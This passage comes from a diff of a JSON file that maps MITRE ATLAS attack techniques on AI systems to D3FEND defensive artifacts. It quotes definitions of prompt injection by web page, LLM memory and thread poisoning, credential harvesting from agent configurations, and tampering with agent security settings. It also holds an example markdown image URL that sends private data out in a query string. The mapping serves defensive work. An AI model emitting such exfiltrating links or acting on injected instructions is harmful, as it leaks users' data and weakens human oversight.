+     "evidence_quote": "",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R135",
+     "verb": "d3f:may-create",
+     "artifact_iri": "d3f:ExecutableFile",
+     "artifact_label": "Executable File",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R136",
+     "verb": "d3f:may-modify",
+     "artifact_iri": "d3f:OperatingSystemExecutableFile",
+     "artifact_label": "Operating System Executable File",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "two downgrades -> ships at low confidence"
+    },
+    {
+     "row_id": "R137",
+     "verb": "d3f:modifies",
+     "artifact_iri": "d3f:FileSystemMetadata",
+     "artifact_label": "File System Metadata",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R138",
+     "verb": "d3f:modifies",
+     "artifact_iri": "d3f:JobSchedule",
+     "artifact_label": "Job Schedule",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "upheld"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0075",
+   "label": "Cloud Service Discovery",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), software-as-a-service (SaaS), or AI-as-a-service (AIaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, AI Inference, Generative AI, Agentic AI, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity. They may use tools to check credentials and enumerate the AI models available in various AIaaS providers' environments including AI21 Labs, Anthropic, AWS Bedrock, Azure, ElevenLabs, MakerSuite, Mistral, OpenAI, OpenRouter, and GCP Vertex AI [[sysdig]].",
+   "latest_id": "AML.T0075",
+   "definition_latest": "Adversaries may discover resources available within an enterprise environment and information needed to identify or access them. Resources may include accounts, groups, systems, devices, virtual machines, files, directories, storage volumes, cloud objects, containers, applications, software, processes, services, network shares, repositories, policies, logs, and other local, remote, or cloud-hosted assets.\n\nAdversaries may enumerate, query, scan, or browse resources to determine what exists, where it is located, how it is related to other resources, and whether it is accessible or useful for subsequent actions.\n\nSee the ATT&CK [Discovery](https://attack.mitre.org/tactics/TA0007/) tactic for techniques describing specific resources, environmental characteristics, and discovery mechanisms.",
+   "latest_name": "Enterprise Resource Discovery",
+   "rows": [
+    {
+     "row_id": "R139",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:WebAPIResource",
+     "artifact_label": "Web API Resource",
+     "disposition": "maps-existing",
+     "evidence_quote": "Microsoft Graph API",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R140",
+     "verb": "d3f:reads",
+     "artifact_iri": "d3f:CloudConfiguration",
+     "artifact_label": "Cloud Configuration",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "upheld"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0076",
+   "label": "Corrupt AI Model",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "An adversary may purposefully corrupt a malicious AI model file so that it cannot be successfully deserialized in order to evade detection by a model scanner. The corrupt model may still successfully execute malicious code before deserialization fails.",
+   "latest_id": "AML.T0076",
+   "definition_latest": "An adversary may purposefully corrupt a malicious AI model file so that it cannot be successfully deserialized in order to evade detection by a model scanner. The corrupt model may still successfully execute malicious code before deserialization fails.",
+   "latest_name": "Corrupt AI Model",
+   "rows": [
+    {
+     "row_id": "R141",
+     "verb": "d3f:corrupts",
+     "artifact_iri": "d3f:File",
+     "artifact_label": "File",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "purposefully corrupt a malicious AI model file",
+     "notes": "File-integrity countermeasures (file hashing, signature verification) meaningfully detect a corrupted model file, since corruption alters the byte stream a hash-based check would flag; the resulting code-execution consequence is already captured by the kept executes:Process mapping."
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0077",
+   "label": "LLM Response Rendering",
+   "wave": "core",
+   "open_pr": 619,
+   "definition_develop": "An adversary may get a large language model (LLM) to respond with private information that is hidden from the user when the response is rendered by the user's client. The private information is then exfiltrated. This can take the form of rendered images, which automatically make a request to an adversary controlled server.\n\nThe adversary gets AI to present an image to the user, which is rendered by the user's client application with no user clicks required. The image is hosted on an attacker-controlled website, allowing the adversary to exfiltrate data through image request parameters. Variants include HTML tags and markdown\n\nFor example, an LLM may produce the following markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=\"private data\")\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=\"private data\">\n```\n\nWhen the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.",
+   "latest_id": "AML.T0077",
+   "definition_latest": "Adversaries may induce a large language model (LLM) to respond with private information structured in a reference to external content that, when rendered by the user's client, makes a request to an adversary-controlled server, exfiltrating the data. The private information can be hidden from the user and the external content can still render properly in the user's client, thus not raising the suspicion of the user.\n\nRendered content can include images, embedded webpages, or link previews and may use HTML, Markdown, or other rendering mechanisms. The private information can be hidden in parts of the URL pointing to an adversary-controlled server, including query parameters or URL path segments, and may be split across multiple requests. Markdown or HTML image tags may automatically render directly in the user's AI chat client. Integrations into applications such as Slack or Microsoft Teams may render external content automatically without requiring the user to take any action.\n\n\nAs an example, the adversary may manipulate the LLM to produce the following markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=\"private data\")\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=\"private data\">\n```\n\nWhen the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.",
+   "latest_name": "LLM Response Rendering",
+   "rows": [
+    {
+     "row_id": "R142",
+     "verb": "d3f:produces",
+     "artifact_iri": "d3f:OutboundInternetWebTraffic",
+     "artifact_label": "Outbound Internet Web Traffic",
+     "disposition": "maps-existing",
+     "evidence_quote": "make a request to an adversary controlled server",
+     "notes": "upheld"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0078",
+   "label": "Drive-by Compromise",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may gain access to an AI system through a user visiting a website over the normal course of browsing, or an AI agent retrieving information from the web on behalf of a user. Websites can contain an [LLM Prompt Injection](/techniques/AML.T0051) which, when executed, can change the behavior of the AI model.\n\nThe same approach may be used to deliver other types of malicious code that don't target AI directly (See [Drive-by Compromise in ATT&CK](https://attack.mitre.org/techniques/T1189/)).",
+   "latest_id": "AML.T0078",
+   "definition_latest": "Adversaries may gain access to an AI system through a user visiting a website over the normal course of browsing, or an AI agent retrieving information from the web on behalf of a user. Websites can contain an [LLM Prompt Injection](/techniques/AML.T0051) which, when executed, can change the behavior of the AI model.\n\nThe same approach may be used to deliver other types of malicious code that don't target AI directly (See [Drive-by Compromise in ATT&CK](https://attack.mitre.org/techniques/T1189/)).",
+   "latest_name": "Drive-by Compromise",
+   "rows": [
+    {
+     "row_id": "R143",
+     "verb": "d3f:injects",
+     "artifact_iri": "d3f:DigitalText",
+     "artifact_label": "Digital Text",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "LLM Prompt Injection",
+     "notes": "Text/content-inspection countermeasures already used for webpages and documents meaningfully apply to detect an injected instruction embedded in delivered web content, even though the exploit only fires once an LLM/agent parses the page; the delivery vector itself is already captured by the kept pro"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0079",
+   "label": "Stage Capabilities",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](/techniques/AML.T0017)) or obtained ([Obtain Capabilities](/techniques/AML.T0016)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](/techniques/AML.T0008)) or was otherwise compromised by them. Capabilities may also be staged on web services, such as GitHub, model registries, such as Hugging Face, or container registries.\n\nAdversaries may stage a variety of AI Artifacts including poisoned datasets ([Publish Poisoned Datasets](/techniques/AML.T0019), malicious models ([Publish Poisoned Models](/techniques/AML.T0058), and prompt injections. They may target names of legitimate companies or products, engage in typosquatting, or use hallucinated entities ([Discover LLM Hallucinations](/techniques/AML.T0062)).",
+   "latest_id": "AML.T0079",
+   "definition_latest": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](/techniques/AML.T0017)) or obtained ([Obtain Capabilities](/techniques/AML.T0016)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](/techniques/AML.T0008)) or was otherwise compromised by them. Capabilities may also be staged on web services, such as GitHub, model registries, such as Hugging Face, or container registries.\n\nAdversaries may stage a variety of AI Artifacts including poisoned datasets ([Publish Poisoned AI Artifacts: Datasets](/techniques/AML.T0115.000), malicious models ([Publish Poisoned AI Artifacts: Models](/techniques/AML.T0115.001), and prompt injections. They may target names of legitimate companies or products, engage in typosquatting, or use hallucinated entities ([Discover LLM Hallucinations](/techniques/AML.T0062)).",
+   "latest_name": "Stage Capabilities",
+   "rows": [
+    {
+     "row_id": "R144",
+     "verb": "d3f:creates",
+     "artifact_iri": "d3f:File",
+     "artifact_label": "File",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "poisoned datasets",
+     "notes": "File-based repository scanning and hash-verification countermeasures meaningfully apply to a poisoned dataset staged as a file, and the staging infrastructure (GitHub, Hugging Face, container registries) is already captured by the kept uses:CodeRepository/uses:SoftwareRepository mappings; the malici"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0080.000",
+   "label": "Memory",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may manipulate the memory of a large language model (LLM) in order to persist changes to the LLM to future chat sessions.\n\nMemory is a common feature in LLMs that allows them to remember information across chat sessions by utilizing a user-specific database. Because the memory is controlled via normal conversations with the user (e.g. \"remember my preference for ...\") an adversary can inject memories via Direct or Indirect Prompt Injection. Memories may contain malicious instructions (e.g. instructions that leak private conversations) or may promote the adversary's hidden agenda (e.g. manipulating the user).",
+   "latest_id": "AML.T0080.000",
+   "definition_latest": "Adversaries may manipulate the memory of a large language model (LLM) in order to persist changes to the LLM across future chat sessions. \n\nMemory is a common feature in LLMs that allows them to remember information across chat sessions by utilizing a user-specific database. Because the memory is controlled via normal conversations with the user (e.g. \"remember my preference for ...\") an adversary can inject memories via Direct or Indirect Prompt Injection. Memories may contain malicious instructions (e.g. instructions that leak private conversations) or may promote the adversary's hidden agenda (e.g. manipulating the user).",
+   "latest_name": "Memory",
+   "rows": [
+    {
+     "row_id": "R145",
+     "verb": "d3f:modifies",
+     "artifact_iri": "d3f:Database",
+     "artifact_label": "Database",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "utilizing a user-specific database",
+     "notes": "LLM memory literally persists in a user-specific database per the technique's own definition, so database write-monitoring/audit-logging and anomaly-detection countermeasures directly apply to catch unauthorized memory writes; this restates the technique's own architecture rather than a generic fill"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0080.001",
+   "label": "Thread",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may introduce malicious instructions into a chat thread of a large language model (LLM) to cause behavior changes which persist for the remainder of the thread. A chat thread may continue for an extended period over multiple sessions.\n\nThe malicious instructions may be introduced via Direct or Indirect Prompt Injection. Direct Injection may occur in cases where the adversary has acquired a user's LLM API keys and can inject queries directly into any thread.\n\nAs the token limits for LLMs rise, AI systems can make use of larger context windows which allow malicious instructions to persist longer in a thread.\nThread Poisoning may affect multiple users if the LLM is being used in a service with shared threads. For example, if an agent is active in a Slack channel with multiple participants, a single malicious message from one user can influence the agent's behavior in future interactions with others.",
+   "latest_id": "AML.T0080.001",
+   "definition_latest": "Adversaries may introduce malicious instructions into a chat thread of a large language model (LLM) to cause behavior changes which persist for the remainder of the thread. A chat thread may continue for an extended period over multiple sessions.\n\nThe malicious instructions may be introduced via Direct or Indirect Prompt Injection. Direct Injection may occur in cases where the adversary has acquired a user's LLM API keys and can inject queries directly into any thread.\n\nAs the token limits for LLMs rise, AI systems can make use of larger context windows which allow malicious instructions to persist longer in a thread.\nThread Poisoning may affect multiple users if the LLM is being used in a service with shared threads. For example, if an agent is active in a Slack channel with multiple participants, a single malicious message from one user can influence the agent's behavior in future interactions with others.",
+   "latest_name": "Thread",
+   "rows": [
+    {
+     "row_id": "R146",
+     "verb": "d3f:injects",
+     "artifact_iri": "d3f:DigitalMessage",
+     "artifact_label": "Digital Message",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "introduce malicious instructions into a chat thread of a large language model",
+     "notes": "A chat thread is fundamentally a sequence of messages (the technique names a shared Slack channel as its example); message-content-inspection countermeasures already applied to instant-messaging/email content generalize meaningfully to scanning thread messages for injected instructions."
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0081",
+   "label": "Modify AI Agent Configuration",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may modify the configuration files for AI agents on a system. This allows malicious changes to persist beyond the life of a single agent and affects any agents that share the configuration.\n\nConfiguration changes may include modifications to the system prompt, tampering with or replacing knowledge sources, modification to settings of connected tools, and more. Through those changes, an attacker could redirect outputs or tools to malicious services, embed covert instructions that exfiltrate data, or weaken security controls that normally restrict agent behavior.\n\nAdversaries may modify or disable a configuration setting related to security controls, such as those that would prevent the AI Agent from taking actions that may be harmful to the user's system without human-in-the-loop oversight. Disabling AI agent security features may allow adversaries to achieve their malicious goals and maintain long-term corruption of the AI agent.",
+   "latest_id": "AML.T0081",
+   "definition_latest": "Adversaries may modify the configuration files for AI agents on a system. This allows malicious changes to persist beyond the life of a single agent and affects any agents that share the configuration.\n\nConfiguration changes may include modifications to the system prompt, tampering with or replacing knowledge sources, modification to settings of connected tools, and more. Through those changes, an attacker could redirect outputs or tools to malicious services, embed covert instructions that exfiltrate data, or weaken security controls that normally restrict agent behavior.\n\nAdversaries may modify or disable a configuration setting related to security controls, such as those that would prevent the AI Agent from taking actions that may be harmful to the user's system without human-in-the-loop oversight. Disabling AI agent security features may allow adversaries to achieve their malicious goals and maintain long-term corruption of the AI agent.",
+   "latest_name": "Modify AI Agent Configuration",
+   "rows": [
+    {
+     "row_id": "R147",
+     "verb": "d3f:modifies",
+     "artifact_iri": "d3f:ApplicationConfiguration",
+     "artifact_label": "Application Configuration",
+     "disposition": "maps-existing",
+     "evidence_quote": "modification to settings of connected tools",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R148",
+     "verb": "d3f:modifies",
+     "artifact_iri": "d3f:ApplicationConfigurationFile",
+     "artifact_label": "Application Configuration File",
+     "disposition": "maps-existing",
+     "evidence_quote": "modify the configuration files for AI agents",
+     "notes": "upheld"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0082",
+   "label": "RAG Credential Harvesting",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may attempt to use their access to a large language model (LLM) on the victim's system to collect credentials. Credentials may be stored in internal documents which can inadvertently be ingested into a RAG database, where they can ultimately be retrieved by an AI agent.",
+   "latest_id": "AML.T0082",
+   "definition_latest": "Adversaries may attempt to use their access to a large language model (LLM) on the victim's system to collect credentials. Credentials may be stored in internal documents which can inadvertently be ingested into a RAG database, where they can ultimately be retrieved by an AI agent.",
+   "latest_name": "RAG Credential Harvesting",
+   "rows": [
+    {
+     "row_id": "R149",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:Credential",
+     "artifact_label": "Credential",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "collect credentials",
+     "notes": "Credential is the actual sensitive artifact this technique targets, not the RAG database or agent that merely provide the exposure path; D3FEND's credential-focused countermeasures (rotation, scoping, secrets scanning of documents before ingestion) apply directly and meaningfully to reduce this expo"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0083",
+   "label": "Credentials from AI Agent Configuration",
+   "wave": "core",
+   "open_pr": 607,
+   "definition_develop": "Adversaries may access the credentials of other tools or services on a system from the configuration of an AI agent.\n\nAI Agents often utilize external tools or services to take actions, such as querying databases, invoking APIs, or interacting with cloud resources. To enable these functions, credentials like API keys, tokens, and connection strings are frequently stored in configuration files. While there are secure methods such as dedicated secret managers or encrypted vaults that can be deployed to store and manage these credentials, in practice they are often placed in less protected locations for convenience or ease of deployment. If an attacker can read or extract these configurations, they may obtain valid credentials that allow direct access to sensitive systems outside the agent itself.",
+   "latest_id": "AML.T0083",
+   "definition_latest": "Adversaries may access the credentials of other tools or services on a system from the configuration of an AI agent.\n\nAI Agents often utilize external tools or services to take actions, such as querying databases, invoking APIs, or interacting with cloud resources. To enable these functions, credentials like API keys, tokens, and connection strings are frequently stored in configuration files. While there are secure methods such as dedicated secret managers or encrypted vaults that can be deployed to store and manage these credentials, in practice they are often placed in less protected locations for convenience or ease of deployment. If an attacker can read or extract these configurations, they may obtain valid credentials that allow direct access to sensitive systems outside the agent itself.",
+   "latest_name": "Credentials from AI Agent Configuration",
+   "rows": [
+    {
+     "row_id": "R150",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:ApplicationConfigurationFile",
+     "artifact_label": "Application Configuration File",
+     "disposition": "maps-existing",
+     "evidence_quote": "stored in configuration files",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R151",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:Credential",
+     "artifact_label": "Credential",
+     "disposition": "maps-existing",
+     "evidence_quote": "the credentials of other tools or services",
+     "notes": "upheld"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0084",
+   "label": "Discover AI Agent Configuration",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may attempt to discover configuration information for AI agents present on the victim's system. Agent configurations can include tools or services they have access to.\n\nAdversaries may directly access agent configuring dashboards or configuration files. They may also obtain configuration details by prompting the agent with questions such as \"What tools do you have access to?\"\n\nAdversaries can use the information they discover about AI agents to help with targeting.",
+   "latest_id": "AML.T0084",
+   "definition_latest": "Adversaries may attempt to discover configuration information for AI agents present on the victim's system. Agent configurations can include tools or services they have access to.\n\nAdversaries may directly access agent configuring dashboards or configuration files. They may also obtain configuration details by prompting the agent with questions such as \"What tools do you have access to?\"\n\nAdversaries can use the information they discover about AI agents to help with targeting.",
+   "latest_name": "Discover AI Agent Configuration",
+   "rows": [
+    {
+     "row_id": "R152",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:ApplicationConfiguration",
+     "artifact_label": "Application Configuration",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "access agent configuring dashboards or configuration files",
+     "notes": "Application-configuration hardening and access-control countermeasures meaningfully apply to protect an AI agent's tool-and-service-access configuration from discovery, exactly as they would for any application's configuration; the class does not need to model 'AI agent' as an owning artifact to be "
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0084.000",
+   "label": "Embedded Knowledge",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may attempt to discover the data sources a particular agent can access.  The AI agent's configuration may reveal data sources or knowledge.\n\nThe embedded knowledge may include sensitive or proprietary material such as intellectual property, customer data, internal policies, or even credentials. By mapping what knowledge an agent has access to, an adversary can better understand the AI agent's role and potentially expose confidential information or pinpoint high-value targets for further exploitation.",
+   "latest_id": "AML.T0084.000",
+   "definition_latest": "Adversaries may attempt to discover the data sources a particular agent can access.  The AI agent's configuration may reveal data sources or knowledge.\n\nThe embedded knowledge may include sensitive or proprietary material such as intellectual property, customer data, internal policies, or even credentials. By mapping what knowledge an agent has access to, an adversary can better understand the AI agent's role and potentially expose confidential information or pinpoint high-value targets for further exploitation.",
+   "latest_name": "Embedded Knowledge",
+   "rows": [
+    {
+     "row_id": "R153",
+     "verb": "d3f:may-access",
+     "artifact_iri": "d3f:Credential",
+     "artifact_label": "Credential",
+     "disposition": "maps-existing",
+     "evidence_quote": "or even credentials",
+     "notes": "upheld"
+    }
+   ]
+  }
+ ]
+}
